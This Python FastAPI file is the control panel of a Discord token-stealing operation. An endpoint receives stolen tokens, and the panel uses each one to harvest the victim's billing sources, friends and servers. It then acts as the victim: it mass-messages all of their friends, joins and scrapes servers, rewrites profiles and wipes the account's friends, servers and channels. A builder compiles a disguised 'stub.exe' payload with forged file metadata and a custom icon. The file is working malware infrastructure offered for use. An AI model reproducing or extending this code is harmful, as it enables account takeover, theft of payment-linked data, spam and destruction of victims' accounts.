import os
import sqlite3
import httpx
import json
import subprocess
import tempfile
import time
from fastapi import FastAPI, BackgroundTasks, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import FileResponse, JSONResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel
from typing import List, Optional
import asyncio

app = FastAPI()

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

Datafile = "accounts.db"

def init_db():
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS accounts
                 (id TEXT PRIMARY KEY,
                  username TEXT,
                  avatar TEXT,
                  token TEXT,
                  valid BOOLEAN,
                  billing_json TEXT,
                  friends_json TEXT,
                  guilds_json TEXT)''')
    try:
        c.execute("ALTER TABLE accounts ADD COLUMN nitro BOOLEAN DEFAULT 0")
    except sqlite3.OperationalError: pass
    try:
        c.execute("ALTER TABLE accounts ADD COLUMN status TEXT DEFAULT 'online'")
    except sqlite3.OperationalError: pass
    conn.commit()
    conn.close()

init_db()

class TokenInput(BaseModel):
    token: str

class AssemblyInfo(BaseModel):
    file_description: Optional[str] = "Discord Token Extractor"
    file_version: Optional[str] = "1.0.0.0"
    product_name: Optional[str] = "Discord Payload"
    product_version: Optional[str] = "1.0.0.0"
    company_name: Optional[str] = ""
    legal_copyright: Optional[str] = ""
    original_filename: Optional[str] = "stub.exe"
    internal_name: Optional[str] = "stub"

class CompileRequest(BaseModel):
    assembly_info: Optional[AssemblyInfo] = None
    icon_data: Optional[str] = None  

class InjectionPayload(BaseModel):
    code: str
    webhook: str

async def fetch_account_data(client, token, user_id, username, avatar):
    headers = {
        "Authorization": token, 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty"
    }
    
    b_res = await client.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=headers)
    await asyncio.sleep(0.5)
    f_res = await client.get("https://discord.com/api/v9/users/@me/relationships", headers=headers)
    await asyncio.sleep(0.5)
    g_res = await client.get("https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
    await asyncio.sleep(0.5)
    s_res = await client.get("https://discord.com/api/v9/users/@me/settings", headers=headers)
    await asyncio.sleep(0.5)
    sub_res = await client.get("https://discord.com/api/v9/users/@me/billing/subscriptions", headers=headers)
    
    billing = b_res.json() if b_res.status_code == 200 else []
    friends = f_res.json() if f_res.status_code == 200 else [{"id": "error", "user": {"username": f"Error {f_res.status_code}: {f_res.text[:30]}"}, "type": -1}]
    guilds = g_res.json() if g_res.status_code == 200 else []
    
    settings = s_res.json() if s_res.status_code == 200 else {}
    status = settings.get("status", "online")
    
    subs = sub_res.json() if sub_res.status_code == 200 else []
    nitro = len(subs) > 0
    
    friends_mini = []
    for fr in (friends if isinstance(friends, list) else []):
        u = fr.get("user", {})
        fid = u.get("id") or fr.get("id")
        fuser = u.get("username") or fr.get("username") or fr.get("nickname") or "Unknown"
        fglobal = u.get("global_name") or fr.get("global_name") or ""
        favatar = u.get("avatar") or fr.get("avatar") or ""
        
        display_str = f"{fuser} ({fglobal})" if fglobal else fuser
        
        rtype = fr.get("type", 0)
        rtag = "Friend" if rtype == 1 else "Blocked" if rtype == 2 else "Pending" if rtype in (3,4) else "Unknown"
        
        if fid:
            friends_mini.append({"id": fid, "username": display_str, "avatar": favatar, "type": rtag})
            
    guilds_mini = []
    for g in (guilds if isinstance(guilds, list) else []):
        guilds_mini.append({"id": g.get("id"), "name": g.get("name"), "icon": g.get("icon"), "owner": g.get("owner", False), "member_count": g.get("approximate_member_count", "?")})

    billing_mini = []
    for b in (billing if isinstance(billing, list) else []):
        billing_mini.append({"id": b.get("id"), "type": b.get("type"), "brand": b.get("brand", "Unknown"), "invalid": b.get("invalid", False)})

    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("""INSERT OR REPLACE INTO accounts 
                 (id, username, avatar, token, valid, billing_json, friends_json, guilds_json, nitro, status) 
                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
              (user_id, username, avatar, token, 1,
               json.dumps(billing_mini), json.dumps(friends_mini), json.dumps(guilds_mini), nitro, status))
    conn.commit()
    conn.close()

@app.post("/add_account")
@app.post("/api/receive_tokens")
async def add_account(data: TokenInput):
    token = data.token.strip().strip('"')
    
    headers = {
        "Authorization": token, 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty"
    }
    
    async with httpx.AsyncClient() as client:
        me_res = await client.get("https://discord.com/api/v9/users/@me", headers=headers)
        
        if me_res.status_code != 200:
            raise HTTPException(status_code=400, detail="Invalid token")
            
        me_data = me_res.json()
        user_id = me_data["id"]
        
        raw_user = me_data.get("username", "Unknown")
        global_name = me_data.get("global_name")
        display_name = global_name if global_name else raw_user
        
        avatar = me_data.get("avatar", "")
        
        await fetch_account_data(client, token, user_id, display_name, avatar)
        return {
            "status": "success",
            "id": user_id,
            "username": display_name,
            "avatar": avatar,
            "token": token,
            "valid": True,
            "billing": [],
            "friends": [],
            "guilds": [],
            "nitro": False,
            "status_val": "online"
        }

@app.get("/accounts")
def get_accounts():
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("SELECT id, username, avatar, token, valid, billing_json, friends_json, guilds_json, nitro, status FROM accounts")
    rows = c.fetchall()
    conn.close()
    
    accounts = []
    for r in rows:
        accounts.append({
            "id": r[0],
            "username": r[1],
            "avatar": r[2],
            "token": r[3],
            "valid": bool(r[4]),
            "billing": json.loads(r[5] or "[]"),
            "friends": json.loads(r[6] or "[]"),
            "guilds": json.loads(r[7] or "[]"),
            "nitro": bool(r[8] if len(r) > 8 else False),
            "status": r[9] if len(r) > 9 else "online"
        })
    return accounts

@app.post("/refresh/{user_id}")
async def refresh_account(user_id: str):
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("SELECT token FROM accounts WHERE id=?", (user_id,))
    row = c.fetchone()
    if not row:
        conn.close()
        raise HTTPException(status_code=404, detail="Account not found")
        
    token = row[0]
    headers = {"Authorization": token, "Content-Type": "application/json"}
    
    async with httpx.AsyncClient() as client:
        me_req = await client.get("https://discord.com/api/v9/users/@me", headers=headers)
        if me_req.status_code == 401:
            c.execute("UPDATE accounts SET valid=0 WHERE id=?", (user_id,))
            conn.commit()
            conn.close()
            return {"status": "invalidated"}
            
        me_data = me_req.json()
        conn.close()
        
        raw_user = me_data.get("username", "Unknown")
        global_name = me_data.get("global_name")
        display_name = global_name if global_name else raw_user
        
        await fetch_account_data(client, token, user_id, display_name, me_data.get("avatar"))
        
    return {"status": "refreshed"}

@app.post("/action/{user_id}")
async def perform_action(user_id: str, payload: dict):
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("SELECT token FROM accounts WHERE id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        raise HTTPException(status_code=404, detail="Account not found")
        
    token = row[0]
    headers = {"Authorization": token, "Content-Type": "application/json"}
    
    action = payload.get("action")
    val = payload.get("value")
    
    async with httpx.AsyncClient() as client:
        if action == "theme":
            await client.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={"theme": val})
        elif action == "language":
            await client.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={"locale": val})
        elif action == "dev_mode":
            await client.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={"developer_mode": val})
        elif action == "status":
            await client.patch("https://discord.com/api/v9/users/@me/settings", headers=headers, json={"status": val})
            
    return {"status": "success"}

@app.post("/relationships/{user_id}/block/{target_id}")
async def block_user(user_id: str, target_id: str):
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("SELECT token FROM accounts WHERE id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row: raise HTTPException(404)
    
    headers = {"Authorization": row[0], "Content-Type": "application/json"}
    
    async with httpx.AsyncClient() as client:
        res = await client.put(f"https://discord.com/api/v9/users/@me/relationships/{target_id}", headers=headers, json={"type": 2})
        if res.status_code not in (200, 204):
            raise HTTPException(400, "Failed to block user.")
    return {"status": "blocked"}

@app.post("/relationships/{user_id}/dm/{target_id}")
async def send_dm(user_id: str, target_id: str, payload: dict):
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("SELECT token FROM accounts WHERE id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row: raise HTTPException(404)
    
    headers = {"Authorization": row[0], "Content-Type": "application/json"}
    msg = payload.get("message", "")
    
    async with httpx.AsyncClient() as client:
        chan_res = await client.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json={"recipients": [target_id]})
        if chan_res.status_code not in (200, 201):
            raise HTTPException(400, "Failed to open DM channel.")
            
        chan_id = chan_res.json()["id"]
        
        msg_res = await client.post(f"https://discord.com/api/v9/channels/{chan_id}/messages", headers=headers, json={"content": msg})
        if msg_res.status_code not in (200, 201):
            raise HTTPException(400, "Failed to send message.")
            
    return {"status": "sent"}

async def perform_dm_all(token: str, friends: list, msg: str):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    async with httpx.AsyncClient() as client:
        for f in friends:
            target_id = f.get("id")
            if not target_id: continue
            
            chan_res = await client.post("https://discord.com/api/v9/users/@me/channels", headers=headers, json={"recipients": [target_id]})
            if chan_res.status_code in (200, 201):
                chan_id = chan_res.json()["id"]
                await client.post(f"https://discord.com/api/v9/channels/{chan_id}/messages", headers=headers, json={"content": msg})
            
            await asyncio.sleep(2)

@app.post("/relationships/{user_id}/dm_all")
async def dm_all(user_id: str, payload: dict, background_tasks: BackgroundTasks):
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("SELECT token, friends_json FROM accounts WHERE id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row: raise HTTPException(404)
    
    background_tasks.add_task(perform_dm_all, row[0], json.loads(row[1] or "[]"), payload.get("message", ""))
    return {"status": "started"}

@app.post("/guilds/{user_id}/join")
async def join_guild(user_id: str, payload: dict):
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("SELECT token FROM accounts WHERE id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row: raise HTTPException(404)
    
    headers = {"Authorization": row[0], "Content-Type": "application/json"}
    invite_link = payload.get("invite_link", "")
    

    invite_code = invite_link.split("/")[-1]
    
    async with httpx.AsyncClient() as client:
        res = await client.post(f"https://discord.com/api/v9/invites/{invite_code}", headers=headers, json={})
        if res.status_code not in (200, 201):
            raise HTTPException(400, f"Failed to join guild. {res.text}")
            
    return {"status": "joined", "data": res.json()}

@app.post("/guilds/{user_id}/leave/{guild_id}")
async def leave_guild(user_id: str, guild_id: str):
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("SELECT token FROM accounts WHERE id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row: raise HTTPException(404)
    
    headers = {"Authorization": row[0], "Content-Type": "application/json"}
    
    async with httpx.AsyncClient() as client:
        res = await client.request("DELETE", f"https://discord.com/api/v9/users/@me/guilds/{guild_id}", headers=headers, json={"lurking": False})
        if res.status_code not in (200, 204):
            raise HTTPException(400, f"Failed to leave guild: {res.text}")
            
    return {"status": "left"}

@app.delete("/remove/{user_id}")
def remove_account(user_id: str):
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("DELETE FROM accounts WHERE id=?", (user_id,))
    conn.commit()
    conn.close()
    return {"status": "deleted"}

@app.get("/guilds/{user_id}/scrape/{guild_id}")
async def scrape_guild(user_id: str, guild_id: str):
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("SELECT token FROM accounts WHERE id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row: raise HTTPException(404)
    
    headers = {"Authorization": row[0]}
    async with httpx.AsyncClient() as client:
        g_res = await client.get(f"https://discord.com/api/v9/guilds/{guild_id}?with_counts=true", headers=headers)
        if g_res.status_code == 200:
            count = g_res.json().get("approximate_member_count", 0)
            if count > 3000:
                raise HTTPException(400, "Server is too big to scrape.")
                
        m_res = await client.get(f"https://discord.com/api/v9/guilds/{guild_id}/members?limit=1000", headers=headers)
        if m_res.status_code == 200:
            members = m_res.json()
            with open(f"scraped_{guild_id}.txt", "w", encoding="utf-8") as f:
                for m in members:
                    u = m.get("user", {})
                    if u: f.write(f"{u.get('id')} | {u.get('username')}\n")
            return {"status": "scraped", "count": len(members)}
        raise HTTPException(400, f"Failed to scrape guild. {m_res.text}")

@app.patch("/settings/{user_id}/profile")
async def edit_profile(user_id: str, payload: dict):
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("SELECT token FROM accounts WHERE id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row: raise HTTPException(404)
    
    headers = {"Authorization": row[0], "Content-Type": "application/json"}
    body = {}
    if "bio" in payload: body["bio"] = payload["bio"]
    if "global_name" in payload: body["global_name"] = payload["global_name"]
    
    async with httpx.AsyncClient() as client:
        res = await client.patch("https://discord.com/api/v9/users/@me/profile", headers=headers, json=body)
        if res.status_code not in (200, 204):
            raise HTTPException(400, "Failed to update profile.")
    return {"status": "success"}

@app.post("/settings/{user_id}/hypesquad")
async def set_hypesquad(user_id: str, payload: dict):
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("SELECT token FROM accounts WHERE id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row: raise HTTPException(404)
    
    headers = {"Authorization": row[0], "Content-Type": "application/json"}
    
    async with httpx.AsyncClient() as client:
        res = await client.post("https://discord.com/api/v9/hypesquad/online", headers=headers, json={"house_id": payload.get("house_id", 1)})
        if res.status_code not in (200, 204):
            raise HTTPException(400, "Failed to set HypeSquad.")
    return {"status": "success"}

async def perform_token_cleaner(token: str):
    headers = {"Authorization": token, "Content-Type": "application/json"}
    async with httpx.AsyncClient() as client:
        g_res = await client.get("https://discord.com/api/v9/users/@me/guilds", headers={"Authorization": token})
        if g_res.status_code == 200:
            for g in g_res.json():
                await client.request("DELETE", f"https://discord.com/api/v9/users/@me/guilds/{g['id']}", headers=headers, json={"lurking": False})
                await asyncio.sleep(1)
                
        f_res = await client.get("https://discord.com/api/v9/users/@me/relationships", headers={"Authorization": token})
        if f_res.status_code == 200:
            for f in f_res.json():
                await client.delete(f"https://discord.com/api/v9/users/@me/relationships/{f['id']}", headers={"Authorization": token})
                await asyncio.sleep(1)
                
        c_res = await client.get("https://discord.com/api/v9/users/@me/channels", headers={"Authorization": token})
        if c_res.status_code == 200:
            for c in c_res.json():
                await client.delete(f"https://discord.com/api/v9/channels/{c['id']}", headers={"Authorization": token})
                await asyncio.sleep(1)

@app.post("/cleaner/{user_id}")
async def start_cleaner(user_id: str, background_tasks: BackgroundTasks):
    conn = sqlite3.connect(Datafile)
    c = conn.cursor()
    c.execute("SELECT token FROM accounts WHERE id=?", (user_id,))
    row = c.fetchone()
    conn.close()
    if not row: raise HTTPException(404)
    
    background_tasks.add_task(perform_token_cleaner, row[0])
    return {"status": "started"}

@app.post("/builder/compile")
async def compile_payload(request: Optional[CompileRequest] = None):
    try:
        cpp_file = "Exe/injection.cpp"
        exe_file = "stub.exe"
        rc_file = "resource.rc"
        
        result = subprocess.run(["g++", "--version"], capture_output=True, text=True)
        if result.returncode != 0:
            raise HTTPException(status_code=500, detail="g++ compiler not found")
        
        use_resources = False
        if request and (request.assembly_info or request.icon_data):
            use_resources = True
            assembly_info = request.assembly_info or AssemblyInfo()
            
            rc_content = f"""#include <windows.h>

1 ICON DISCARDABLE "icon.ico"

1 VERSIONINFO
FILEVERSION {assembly_info.file_version.replace('.', ',')}
PRODUCTVERSION {assembly_info.product_version.replace('.', ',')}
FILEOS 0x40004L
FILETYPE 0x1L
{{
    BLOCK "StringFileInfo"
    {{
        BLOCK "040904B0"
        {{
            VALUE "CompanyName", "{assembly_info.company_name}"
            VALUE "FileDescription", "{assembly_info.file_description}"
            VALUE "FileVersion", "{assembly_info.file_version}"
            VALUE "InternalName", "{assembly_info.internal_name}"
            VALUE "LegalCopyright", "{assembly_info.legal_copyright}"
            VALUE "OriginalFilename", "{assembly_info.original_filename}"
            VALUE "ProductName", "{assembly_info.product_name}"
            VALUE "ProductVersion", "{assembly_info.product_version}"
        }}
    }}
    BLOCK "VarFileInfo"
    {{
        VALUE "Translation", 0x409, 1200
    }}
}}
"""
            
            with open(rc_file, "w", encoding="utf-8") as f:
                f.write(rc_content)
            
            if request.icon_data:
                import base64
                try:
                    icon_data = base64.b64decode(request.icon_data)
                    with open("icon.ico", "wb") as f:
                        f.write(icon_data)
                except Exception as e:
                    print(f"Failed to decode icon: {e}")
        
        compile_cmd = [
            "g++",
            cpp_file,
            "-o", exe_file,
            "-std=c++17",
            "-static",
            "-static-libgcc",
            "-static-libstdc++",
            "-lws2_32",
            "-lcrypt32",
            "-lbcrypt",
            "-lwinhttp"
        ]
        
        if use_resources:
            try:
                windres_cmd = ["windres", "-i", rc_file, "-o", "resource.o"]
                result = subprocess.run(windres_cmd, capture_output=True, text=True)
                
                if result.returncode == 0:
                    compile_cmd.extend(["resource.o"])
                else:
                    print(f"Resource compilation failed: {result.stderr}")
            except FileNotFoundError:
                print("windres not found, skipping resources")
        
        result = subprocess.run(compile_cmd, capture_output=True, text=True)
        
        if use_resources:
            for temp_file in [rc_file, "resource.o", "icon.ico"]:
                try:
                    os.remove(temp_file)
                except:
                    pass
        
        if result.returncode != 0:
            raise HTTPException(status_code=500, detail=f"Compilation failed: {result.stderr}")
        
        return {"status": "success", "message": "Compilation successful"}
        
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Compilation error: {str(e)}")

@app.get("/builder/download")
async def download_executable():
    exe_file = "stub.exe"
    
    if not os.path.exists(exe_file):
        raise HTTPException(status_code=404, detail="Executable not found. Please compile first.")
    
    return FileResponse(
        exe_file,
        media_type="application/octet-stream",
        filename="stub.exe"
    )

os.makedirs("static", exist_ok=True)
app.mount("/static", StaticFiles(directory="static"), name="static")

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
